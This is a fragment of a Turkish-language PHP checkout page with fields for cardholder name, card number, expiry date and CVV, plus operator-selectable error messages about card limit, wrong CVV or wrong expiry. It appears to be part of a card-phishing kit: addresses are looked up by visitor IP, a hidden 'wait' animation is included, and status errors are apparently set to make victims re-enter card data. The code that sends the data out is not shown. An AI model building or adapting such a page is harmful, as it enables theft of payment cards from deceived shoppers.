                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.8107 11.9829C14.8107 8.16086 16.6006 4.75586 19.3878 2.56226C17.2781 0.898875 14.6687 -0.00383994 11.982 0.000258032C5.36347 0.000258032 -0.000976562 5.36546 -0.000976562 11.9829C-0.000976562 18.6009 5.36347 23.9655 11.982 23.9655C14.7777 23.9655 17.3495 23.0085 19.3878 21.4035C16.6006 19.2093 14.8107 15.8055 14.8107 11.9835" fill="#EB001B"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M38.7765 11.9829C38.7765 18.6009 33.4115 23.9655 26.7935 23.9655C24.1068 23.9696 21.4974 23.0669 19.3877 21.4035C22.1749 19.2099 23.9649 15.8055 23.9649 11.9829C23.9649 8.16086 22.1749 4.75646 19.3877 2.56226C21.4974 0.898792 24.1068 -0.00393328 26.7935 0.000258674C33.4115 0.000258674 38.7765 5.36486 38.7765 11.9829Z" fill="#F79E1B"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M52.118 21.9593H51.2251L52.3556 19.9889L50.7205 17.0537H51.6247L52.8104 19.1753L53.9535 17.0537H54.8386L52.118 21.9599V21.9593ZM48.7457 17.7173C48.5203 17.7115 48.2988 17.7775 48.1133 17.9057C47.9278 18.0339 47.7878 18.2178 47.7136 18.4307C47.6596 18.5747 47.6332 18.7319 47.6332 18.9017C47.6332 19.0709 47.6602 19.2275 47.7136 19.3721C47.7676 19.5161 47.8432 19.6409 47.9416 19.7465C48.0388 19.8521 48.1552 19.9343 48.2915 19.9943C48.4277 20.0555 48.5795 20.0855 48.7457 20.0855C48.9173 20.0855 49.0727 20.0537 49.2113 19.9913C49.3499 19.9277 49.467 19.8431 49.5618 19.7363C49.6566 19.6295 49.7292 19.5047 49.7808 19.3601C49.8329 19.213 49.8591 19.0579 49.8582 18.9017C49.8582 18.7397 49.8324 18.5867 49.7802 18.4427C49.7324 18.3044 49.6583 18.1766 49.5618 18.0665C49.4641 17.9581 49.3447 17.8714 49.2113 17.8121C49.0647 17.7475 48.9059 17.7151 48.7457 17.7173ZM48.8417 16.9577C49.0854 16.9562 49.3268 17.0038 49.5516 17.0979C49.7764 17.1919 49.9799 17.3303 50.1498 17.5049C50.3178 17.6771 50.448 17.8829 50.5428 18.1205C50.6383 18.3587 50.6857 18.6185 50.6857 18.9017C50.6857 19.1843 50.6377 19.4441 50.5428 19.6823C50.454 19.9115 50.3206 20.1207 50.1504 20.2979C49.9805 20.4726 49.7771 20.6112 49.5523 20.7053C49.3275 20.7995 49.086 20.8472 48.8423 20.8457C48.5777 20.8457 48.3509 20.7965 48.1618 20.6987C47.9773 20.6046 47.8152 20.4718 47.6866 20.3093V20.7491H46.8825V15.5651H47.6866V17.4935C47.815 17.3315 47.974 17.2019 48.1618 17.1041C48.3509 17.0063 48.5777 16.9577 48.8417 16.9577ZM64.3572 18.8999C64.3572 18.2495 64.782 17.7161 65.4763 17.7161C66.1411 17.7161 66.5882 18.2267 66.5882 18.8999C66.5882 19.5731 66.1411 20.0837 65.4763 20.0837C64.782 20.0837 64.3572 19.5497 64.3572 18.8999ZM67.3454 18.8999V17.0519H66.5426V17.5001C66.2876 17.1677 65.9017 16.9589 65.3761 16.9589C64.3416 16.9589 63.5309 17.7713 63.5309 18.9005C63.5309 20.0303 64.3416 20.8421 65.3761 20.8421C65.9017 20.8421 66.2876 20.6333 66.5426 20.3009V20.7497H67.3454V18.8999ZM94.4617 18.8999C94.4617 18.2495 94.8865 17.7161 95.5814 17.7161C96.2451 17.7161 96.6933 18.2267 96.6933 18.8999C96.6933 19.5731 96.2451 20.0837 95.5814 20.0837C94.8865 20.0837 94.4617 19.5497 94.4617 18.8999ZM97.45 18.8999V15.5657H96.6471V17.4995C96.3921 17.1671 96.0062 16.9583 95.4812 16.9583C94.4467 16.9583 93.636 17.7707 93.636 18.8999C93.636 20.0297 94.4461 20.8415 95.4812 20.8415C96.0062 20.8415 96.3921 20.6327 96.6471 20.3003V20.7491H97.4494V18.8999H97.45ZM77.3057 17.6777C77.8229 17.6777 78.1548 18.0023 78.24 18.5753H76.3246C76.4098 18.0413 76.7338 17.6777 77.3057 17.6777ZM77.3207 16.9583C76.24 16.9583 75.4833 17.7473 75.4833 18.8999C75.4833 20.0759 76.2712 20.8415 77.3753 20.8415C77.9309 20.8415 78.4404 20.7029 78.8886 20.3237L78.495 19.7279C78.1901 19.9731 77.8121 20.1093 77.4209 20.1149C76.9042 20.1149 76.4326 19.8749 76.3168 19.2089H79.0578C79.0656 19.1087 79.0734 19.0085 79.0734 18.8999C79.0656 17.7479 78.3552 16.9583 77.3213 16.9583H77.3207ZM87.0109 18.8999C87.0109 18.2495 87.4357 17.7161 88.1306 17.7161C88.7942 17.7161 89.2419 18.2267 89.2419 18.8999C89.2419 19.5731 88.7942 20.0837 88.1306 20.0837C87.4357 20.0837 87.0109 19.5497 87.0109 18.8999ZM89.9991 18.8999V17.0519H89.1963V17.5001C88.9418 17.1677 88.5554 16.9589 88.0304 16.9589C86.9953 16.9589 86.1846 17.7713 86.1846 18.9005C86.1846 20.0303 86.9953 20.8421 88.0304 20.8421C88.5554 20.8421 88.9418 20.6333 89.1963 20.3009V20.7497H89.9991V18.8999ZM82.4787 18.8999C82.4787 20.0219 83.2588 20.8415 84.4469 20.8415C85.0037 20.8415 85.374 20.7179 85.7754 20.4011L85.3896 19.7507C85.0889 19.9679 84.7715 20.0837 84.4241 20.0837C83.7838 20.0753 83.3128 19.6115 83.3128 18.8999C83.3128 18.1883 83.7838 17.7239 84.4241 17.7161C84.7715 17.7161 85.0889 17.8319 85.3902 18.0491L85.7754 17.3993C85.3734 17.0819 85.0037 16.9583 84.4475 16.9583C83.2594 16.9583 82.4793 17.7785 82.4793 18.8999H82.4787ZM92.8254 16.9583C92.3615 16.9583 92.0603 17.1743 91.8521 17.4995V17.0513H91.0564V20.7491H91.8599V18.6761C91.8599 18.0641 92.1227 17.7239 92.6472 17.7239C92.8098 17.7239 92.979 17.7479 93.1494 17.8169L93.396 17.0591C93.213 16.9932 93.0199 16.9591 92.8254 16.9583ZM71.3136 17.3453C70.9277 17.0897 70.3955 16.9583 69.8081 16.9583C68.8744 16.9583 68.2719 17.4065 68.2719 18.1421C68.2719 18.7451 68.7196 19.1165 69.5452 19.2323L69.9239 19.2869C70.3637 19.3487 70.5731 19.4645 70.5731 19.6739C70.5731 19.9595 70.2791 20.1221 69.7312 20.1221C69.1756 20.1221 68.7736 19.9445 68.5035 19.7351L68.1249 20.3621C68.5653 20.6873 69.121 20.8421 69.7234 20.8421C70.7891 20.8421 71.4066 20.3387 71.4066 19.6349C71.4066 18.9851 70.9205 18.6449 70.1171 18.5285L69.739 18.4745C69.391 18.4277 69.1132 18.3587 69.1132 18.1109C69.1132 17.8397 69.376 17.6777 69.8159 17.6777C70.2875 17.6777 70.7423 17.8559 70.9661 17.9951L71.3142 17.3453H71.3136ZM81.668 16.9583C81.2042 16.9583 80.9036 17.1743 80.6948 17.4995V17.0513H79.8997V20.7491H80.7026V18.6761C80.7026 18.0641 80.9654 17.7239 81.4904 17.7239C81.6524 17.7239 81.8223 17.7479 81.9921 17.8169L82.2399 17.0591C82.0564 16.9932 81.863 16.9591 81.668 16.9583ZM74.8191 17.0513H73.5074V15.9293H72.6967V17.0513H71.9466V17.7857H72.6967V19.4729C72.6967 20.3309 73.0285 20.8415 73.9778 20.8415C74.3258 20.8415 74.7261 20.7335 74.9817 20.5553L74.7501 19.8671C74.51 20.0063 74.2484 20.0753 74.0396 20.0753C73.6382 20.0753 73.5074 19.8281 73.5074 19.4567V17.7857H74.8191V17.0519V17.0513ZM62.8205 20.7491V18.4277C62.8205 17.5541 62.2648 16.9661 61.3695 16.9583C60.8979 16.9505 60.4113 17.0975 60.0722 17.6153C59.8178 17.2055 59.4158 16.9583 58.8523 16.9583C58.4581 16.9583 58.0723 17.0741 57.771 17.5073V17.0513H56.9688V20.7491H57.7788V18.6989C57.7788 18.0569 58.1341 17.7161 58.6819 17.7161C59.2154 17.7161 59.4848 18.0641 59.4848 18.6911V20.7491H60.2955V18.6989C60.2955 18.0569 60.6669 17.7161 61.1991 17.7161C61.7476 17.7161 62.0098 18.0641 62.0098 18.6911V20.7491H62.8205ZM136.382 5.76474C135.559 5.21994 134.422 4.93914 133.17 4.93914C131.176 4.93914 129.891 5.89674 129.891 7.46514C129.891 8.75274 130.847 9.54474 132.609 9.79314L133.417 9.90834C134.356 10.0403 134.801 10.2881 134.801 10.7339C134.801 11.3441 134.175 11.6915 133.005 11.6915C131.818 11.6915 130.962 11.3111 130.386 10.8659L129.578 12.2027C130.517 12.8963 131.704 13.2263 132.989 13.2263C135.263 13.2263 136.58 12.1535 136.58 10.6511C136.58 9.26394 135.542 8.53854 133.829 8.29074L133.022 8.17494C132.28 8.07594 131.687 7.92714 131.687 7.39914C131.687 6.82074 132.247 6.47454 133.187 6.47454C134.192 6.47454 135.163 6.85434 135.641 7.15134L136.382 5.76534V5.76474ZM128.161 5.76474C127.338 5.21994 126.201 4.93914 124.948 4.93914C122.954 4.93914 121.67 5.89674 121.67 7.46514C121.67 8.75274 122.625 9.54474 124.388 9.79314L125.196 9.90834C126.135 10.0403 126.579 10.2881 126.579 10.7339C126.579 11.3441 125.954 11.6915 124.783 11.6915C123.597 11.6915 122.74 11.3111 122.164 10.8659L121.357 12.2027C122.296 12.8963 123.482 13.2263 124.767 13.2263C127.041 13.2263 128.359 12.1535 128.359 10.6511C128.359 9.26394 127.321 8.53854 125.607 8.29074L124.8 8.17494C124.059 8.07594 123.465 7.92714 123.465 7.39914C123.465 6.82074 124.026 6.47454 124.965 6.47454C125.97 6.47454 126.942 6.85434 127.419 7.15134L128.161 5.76534V5.76474ZM108.538 9.04974C108.538 10.4369 107.632 11.5757 106.149 11.5757C104.732 11.5757 103.776 10.4855 103.776 9.04974C103.776 7.61334 104.732 6.52374 106.149 6.52374C107.632 6.52374 108.538 7.66374 108.538 9.04974ZM102.162 9.04974V15.8513H103.875V12.0377C104.419 12.7475 105.243 13.1933 106.364 13.1933C108.571 13.1933 110.301 11.4599 110.301 9.04974C110.301 6.63954 108.571 4.90614 106.364 4.90614C105.243 4.90614 104.42 5.35194 103.875 6.06174V5.10414H102.162V9.04974ZM113.316 9.06654C113.316 7.67934 114.223 6.54054 115.705 6.54054C117.123 6.54054 118.078 7.63014 118.078 9.06654C118.078 10.5023 117.123 11.5925 115.705 11.5925C114.223 11.5925 113.316 10.4525 113.316 9.06654ZM119.693 9.06654V5.12094H117.979V6.07854C117.435 5.36874 116.611 4.92234 115.491 4.92234C113.283 4.92234 111.554 6.65634 111.554 9.06654C111.554 11.4767 113.283 13.2095 115.491 13.2095C116.611 13.2095 117.435 12.7643 117.979 12.0545V13.0121H119.693V9.06594V9.06654ZM62.5702 9.06654C62.5702 7.67934 63.4763 6.54054 64.9591 6.54054C66.3764 6.54054 67.3316 7.63014 67.3316 9.06654C67.3316 10.5023 66.3764 11.5925 64.9591 11.5925C63.4769 11.5925 62.5708 10.4525 62.5708 9.06654H62.5702ZM68.947 9.06654V5.12094H67.2332V6.07854C66.6896 5.36874 65.8651 4.92234 64.7454 4.92234C62.5372 4.92234 60.8073 6.65634 60.8073 9.06654C60.8073 11.4767 62.5378 13.2095 64.7454 13.2095C65.8657 13.2095 66.6896 12.7643 67.2332 12.0545V13.0121H68.947V9.06594V9.06654ZM90.2008 6.45834C91.3042 6.45834 92.0129 7.15134 92.1941 8.37234H88.1078C88.289 7.23354 88.9815 6.45834 90.2008 6.45834ZM90.2332 4.92234C87.9266 4.92234 86.3118 6.60654 86.3118 9.06654C86.3118 11.5751 87.9926 13.2095 90.349 13.2095C91.5347 13.2095 92.622 12.9131 93.5778 12.1043L92.7378 10.8323C92.0783 11.3603 91.2382 11.6579 90.4474 11.6579C89.3433 11.6579 88.3388 11.1467 88.0916 9.72594H93.9403C93.9571 9.51234 93.9733 9.29754 93.9733 9.06594C93.9571 6.60594 92.4407 4.92234 90.2332 4.92234ZM77.4149 5.74794C76.591 5.20314 75.4539 4.92234 74.2022 4.92234C72.2083 4.92234 70.9235 5.87994 70.9235 7.44834C70.9235 8.73594 71.8794 9.52854 73.6424 9.77634L74.4494 9.89214C75.3885 10.0241 75.8332 10.2713 75.8332 10.7171C75.8332 11.3279 75.2073 11.6747 74.0378 11.6747C72.8509 11.6747 71.9946 11.2949 71.418 10.8491L70.6109 12.1865C71.5494 12.8801 72.7363 13.2095 74.021 13.2095C76.2952 13.2095 77.6129 12.1367 77.6129 10.6343C77.6129 9.24834 76.5748 8.52174 74.8617 8.27454L74.0534 8.15814C73.3123 8.05914 72.7195 7.91034 72.7195 7.38234C72.7195 6.80454 73.2799 6.45834 74.219 6.45834C75.2241 6.45834 76.1956 6.83754 76.6732 7.13514L77.4149 5.74794ZM99.5093 4.92234C98.521 4.92234 97.8784 5.38434 97.4332 6.07854V5.12094H95.7362V13.0121H97.4494V8.58774C97.4494 7.28334 98.0098 6.55734 99.1301 6.55734C99.4769 6.55734 99.8382 6.60654 100.201 6.75534L100.729 5.13774C100.349 4.98894 99.8556 4.92234 99.5093 4.92234ZM84.8951 5.12034H82.0941V2.72754H80.3647V5.12154H78.7662V6.68934H80.3647V10.2887C80.3647 12.1205 81.0728 13.2107 83.0992 13.2107C83.8408 13.2107 84.6977 12.9791 85.2413 12.5999L84.7469 11.1299C84.2363 11.4275 83.6758 11.5757 83.2312 11.5757C82.3743 11.5757 82.0941 11.0477 82.0941 10.2557V6.68934H84.8951V5.12094V5.12034ZM59.2922 13.0127V8.05974C59.2922 6.19374 58.1053 4.93974 56.1941 4.92294C55.189 4.90674 54.1509 5.22054 53.4261 6.32634C52.8818 5.45154 52.0256 4.92294 50.8231 4.92294C49.983 4.92294 49.1591 5.17074 48.5165 6.09594V5.12094H46.8027V13.0121H48.5327V8.63694C48.5327 7.26714 49.2905 6.54054 50.4606 6.54054C51.5971 6.54054 52.1738 7.28334 52.1738 8.62074V13.0121H53.9043V8.63694C53.9043 7.26714 54.6946 6.54054 55.8317 6.54054C57.0018 6.54054 57.5616 7.28334 57.5616 8.62074V13.0121H59.2922V13.0127Z" fill="#333333"></path>
                                             </g>
                                             <defs>
                                                <clipPath id="clip0_883_73083">
                                                   <rect width="136.811" height="24" fill="white"></rect>
                                                </clipPath>
                                             </defs>
                                          </svg>
                                       </div>
                                    </div>
                                    <div>
                                       <div class="mt-3 relative">
                                          <div class="relative" value="">
                                             <input placeholder="İsim Soyisim" id="cardHolderName" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer" value="<?php if ($checkAdres['ip_adresi']): ?><?= $checkAdres['isim']; ?> <?= $checkAdres['soyisim']; ?><?php endif; ?>">
                                             <label for="cardHolderName" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">İsim Soyisim</label>
                                          </div>
                                       </div>
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="Kredi Kartı Numarası" id="cardNumber" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer">
                                             <label for="cardNumber" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">Kredi Kartı Numarası</label>
                                          </div>
                                       </div>
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="Son Kullanım Tarihi" id="expireDate" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer">
                                             <label for="expireDate" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">Son Kullanım Tarihi</label>
                                          </div>
                                       </div>
                                       <div class="mt-6 relative">
                                          <div class="relative" value="">
                                             <input placeholder="CVV" id="cvc" class=" ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary false accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full tracking-wide  form-input peer">
                                             <label for="cvc" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">CVV</label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="desktop:ml-10 laptop:ml-4 laptop:pt-0 mobile:pt-8 desktop:w-[460px] laptop:w-[314px]">
                     <div>
                        <div class="font-medium text-md mb-4">Sepet Özeti</div>
                        <div class="flex items-center mt-2">
                           <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                              <path d="M14.125 7.75L8.62497 13L5.875 10.375" stroke="#4CAF50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                              <path d="M10 19C14.9706 19 19 14.9706 19 10C19 5.02944 14.9706 1 10 1C5.02944 1 1 5.02944 1 10C1 14.9706 5.02944 19 10 19Z" stroke="#4CAF50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                           </svg>
                           <div class="text-brand-status-success ml-2 text-xs font-medium">Ücretsiz Teslimat</div>
                        </div>
                        <div class="bg-white rounded-3xl py-4 mt-4 text-sm space-y-4">
                           <div class="flex items-center justify-between px-4 ">
                              <div>Sepet Tutarı</div>
                              <div> ₺<?php echo $toplamFiyat; ?></div>
                           </div>
                           <div class="flex items-center justify-between px-4 ">
                              <div class="flex items-center"><span class="pr-1">Kargo Ücreti</span></div>
                              <div> ₺0,00</div>
                           </div>
                           <div class="ml-4 text-brand-gray-secondary space-y-4 px-4"></div>
                           <div class="flex items-center justify-between px-4 border-t border-t-brand-gray-border/50 pt-4 font-medium">
                              <div>Toplam</div>
                              <div class="text-base text-[#333]"> ₺<?php echo $toplamFiyat; ?></div>
                           </div>
                        </div>
                        <div class="space-y-2 mt-4 mb-7 w-full">
                           <div class="flex flex-wrap">
                              <label class="inline-flex items-start select-none">
                                 <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                    <div class="opacity-100 text-brand-blue-primary">
                                       <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                          <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                       </svg>
                                    </div>
                                 </div>
                                 <span class="flex self-center ml-2 cursor-pointer text-xs"><span class="cursor-default"><span class="text-brand-blue-primary cursor-pointer">Cayma Hakkı</span>’nı, <span class="text-brand-blue-primary cursor-pointer">Ön Bilgilendirme Formu</span>’nu ve <span class="text-brand-blue-primary cursor-pointer">Mesafeli Satış Sözleşmesi</span>’ni okudum ve kabul ediyorum.</span></span>
                              </label>
                           </div>
                        </div>

                        <div class="fixed inset-0 ios-bottom w-full z-[50] flex items-center justify-center pointer-events-none" style='display: none' id='errNotify'>
                           <div class="w-[calc(100%-1rem)] text-center relative desktop:max-w-[445px] tablet:max-w-[375px] mobile:max-w-[343px] flex flex-col p-4 items-center justify-center  bg-white rounded-3xl border border-brand-gray-border pointer-events-auto">
                              <div class=" mt-[34px]">
                                 <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg" id="errsvg">
                                    <circle cx="40" cy="40" r="40" fill="#F3F6FA"></circle>
                                    <path d="M40.0977 25C38.9438 25 38 25.9439 38 27.0977V44.8814C38 46.0352 38.9439 46.9791 40.0977 46.9791C41.2516 46.9791 42.1954 46.0352 42.1954 44.8814V27.0977C42.1954 25.9438 41.2516 25 40.0977 25Z" fill="#F34133"></path>
                                    <path d="M40.0977 50C38.9438 50 38 50.9439 38 52.0977C38 53.2516 38.9439 54.1954 40.0977 54.1954C41.2516 54.1954 42.1954 53.2516 42.1954 52.0977C42.1954 50.8392 41.2516 50 40.0977 50Z" fill="#F34133"></path>
                                 </svg>
                                 <img src="https://media.tenor.com/-n8JvVIqBXkAAAAM/dddd.gif" style="display: none" id="beklegif" width="50px">
                              </div>
                              <div class="text-xl font-medium text-brand-gray-primary mt-6" id="errtitle">Hata</div>
                              <div class="text-sm font-normal text-brand-gray-primary mt-2 whitespace-pre-line break-words" id='errNotifyText'></div>
                              <div class="self-stretch mt-8" id="errkapabuton"><button class="bg-brand-blue-primary  rounded-full text-base  px-5 py-3 text-center w-full text-white " onclick="errNotifyKapat();">Tamam</button></div>
                              <div class="absolute top-4 right-4 cursor-pointer" id="errkapaicon" onclick="errNotifyKapat();">
                                 <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M2 2L16 16M16 2L2 16" stroke="#333333" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                        </div>



                        <div class="fixed inset-0 z-[49] bg-black/40 " style='display: none' id='notifyBg'></div>
                        <script>
                           function errNotify(text) {
                              document.getElementById('errNotify').style.display = '';
                              document.getElementById('notifyBg').style.display = '';
                              document.getElementById('errNotifyText').innerHTML = text;
                           }

                           function errNotifyKapat() {
                              document.getElementById('errNotify').style.display = 'none';
                              document.getElementById('notifyBg').style.display = 'none';
                              document.getElementById('errNotifyText').innerHTML = '';
                           }
                        </script>

                        <div class="mb-4"></div>
                        <?php if ($_GET['status'] == "limit") {
                           echo '<script>errNotify("Kartınızın limiti yetersiz olduğundan ödeme işlemi gerçekleştirilemedi. Lütfen tekrar deneyiniz.")</script>';
                        } else if ($_GET['status'] == "internet") {
                           echo '<script>errNotify("Kartınızın durumu İnternet Alışverişlerine Kapalı olduğundan ödeme işlemi 			gerçekleştirilemedi. Lütfen tekrar deneyiniz.")</script>';
                        } else if ($_GET['status'] == "adres") {
                           echo '<script>errNotify("Lütfen teslimat adresi giriniz.")</script>';
                        } else if ($_GET['status'] == "skt") {
                           echo '<script>errNotify("Girmiş olduğunuz kart numarasının Son Kullanma Tarihi bilgisi hatalıdır. Lütfen düzeltip tekrar ödeme yapınız.")</script>';
                        } else if ($_GET['status'] == "cvv") {
                           echo '<script>errNotify("Girmiş olduğunuz kart numarasının CVV bilgisi hatalıdır. Lütfen düzeltip tekrar ödeme yapınız.")</script>';
                        } else {
                           echo '<div class="error checkout__error js-error-non_field_errors "></div>';
                        }

                        ?>
                        <div class="mobile:pb-8"><button class="bg-brand-blue-primary  rounded-full text-base  px-5 py-3 text-center w-full text-white " id="odemeyap">Devam Et</button></div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="h-[calc(64px+env(safe-area-inset-bottom))] bg-white" id="m1" style="display: none;"></div>
         <div class="fixed bottom-0 bg-white w-full  z-[3]" id="m2" style="display: none;">
            <div class="ios-padding border-t w-full flex justify-around pt-2">
               <div class="flex flex-col items-center relative" onclick="window.location.href='/'">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.35508 21.3C4.47061 21.3 3.7 20.5395 3.7 19.5434V10.2754C3.7 9.88426 3.87608 9.51394 4.17943 9.26707L11.1794 3.57032C11.6573 3.18138 12.3426 3.18138 12.8206 3.57032L19.8206 9.2671C20.1239 9.51397 20.3 9.88429 20.3 10.2754V19.5434C20.3 20.5395 19.5294 21.3 18.6449 21.3H5.35508Z" stroke="#8D939C" stroke-width="1.4"></path>
                        <path d="M15.0187 14.0654C14.9404 14.0262 14.8557 14.0041 14.7695 14.0005C14.6833 13.9969 14.5972 14.0118 14.5163 14.0444C14.4355 14.077 14.3613 14.1266 14.298 14.1903C14.2348 14.2541 14.1838 14.3308 14.1479 14.416C13.9767 14.8207 13.7021 15.1636 13.3569 15.404C13.0116 15.6444 12.6102 15.7722 12.2001 15.7722C11.79 15.7722 11.3885 15.6444 11.0433 15.404C10.698 15.1636 10.4235 14.8207 10.2523 14.416C10.216 14.331 10.1646 14.2547 10.1012 14.1912C10.0377 14.1278 9.96335 14.0786 9.88238 14.0464C9.8014 14.0142 9.71538 13.9997 9.62923 14.0036C9.54307 14.0075 9.45847 14.0298 9.38025 14.0692C9.30203 14.1086 9.23172 14.1644 9.17335 14.2333C9.11497 14.3023 9.06967 14.383 9.04002 14.471C9.01038 14.5589 8.99697 14.6524 9.00057 14.746C9.00417 14.8396 9.0247 14.9314 9.061 15.0164C9.33726 15.6682 9.77974 16.2203 10.336 16.6073C10.8923 16.9943 11.539 17.2 12.1996 17.2C12.8602 17.2 13.5069 16.9943 14.0632 16.6073C14.6195 16.2203 15.062 15.6682 15.3382 15.0164C15.3749 14.9313 15.3957 14.8392 15.3994 14.7454C15.4031 14.6515 15.3897 14.5578 15.36 14.4696C15.3303 14.3814 15.2848 14.3005 15.2261 14.2315C15.1675 14.1624 15.0968 14.1067 15.0183 14.0674L15.0187 14.0654Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Ana Sayfa</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="9" r="4.8" stroke="#8D939C" stroke-width="1.4"></circle>
                        <path d="M19.8203 13.1787L23.4997 16.8581" stroke="#8D939C" stroke-width="1.4" stroke-linecap="round"></path>
                        <path d="M7.97511 12.877L7.97519 12.8768C8.00852 12.8175 8.00851 12.7426 7.9752 12.6834L7.97511 12.6832C7.9425 12.6252 7.88702 12.5963 7.83445 12.5963L1.1659 12.5963C1.12617 12.5963 1.08537 12.6123 1.05313 12.6455L7.97511 12.877ZM7.97511 12.877C7.9425 12.935 7.88701 12.9639 7.83445 12.9639L1.1659 12.9639C1.12616 12.9639 1.08537 12.9478 1.05313 12.9147C1.02067 12.8814 1 12.8332 1 12.7801M7.97511 12.877L1 12.7801M1 12.7801C1 12.727 1.02066 12.6788 1.05313 12.6455L1 12.7801Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M6.97511 6.11329L6.97519 6.11315C7.00852 6.05388 7.00851 5.97893 6.9752 5.91968L6.97511 5.91953C6.9425 5.86149 6.88702 5.83263 6.83445 5.83263L1.1659 5.83263C1.12617 5.83263 1.08537 5.84868 1.05313 5.88178L6.97511 6.11329ZM6.97511 6.11329C6.9425 6.17133 6.88701 6.2002 6.83445 6.2002L1.1659 6.2002C1.12616 6.2002 1.08537 6.18414 1.05313 6.15104C1.02067 6.11771 1 6.06953 1 6.01641M6.97511 6.11329L1 6.01641M1 6.01641C1 5.96329 1.02066 5.91512 1.05313 5.88179L1 6.01641Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M15.9752 19.6133L15.9753 19.6131C16.0086 19.5539 16.0086 19.4789 15.9753 19.4197L15.9752 19.4195C15.9426 19.3615 15.8871 19.3326 15.8345 19.3326L1.1659 19.3326C1.12617 19.3326 1.08537 19.3487 1.05313 19.3818L15.9752 19.6133ZM15.9752 19.6133C15.9426 19.6713 15.8871 19.7002 15.8345 19.7002L1.1659 19.7002C1.12616 19.7002 1.08537 19.6841 1.05313 19.651C1.02067 19.6177 1 19.5695 1 19.5164M15.9752 19.6133L1 19.5164M1 19.5164C1 19.4633 1.02066 19.4151 1.05313 19.3818L1 19.5164Z" fill="#8D939C" stroke="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kategoriler</div>
               </div>
               <?php if ($sepetSayisi == 0): ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
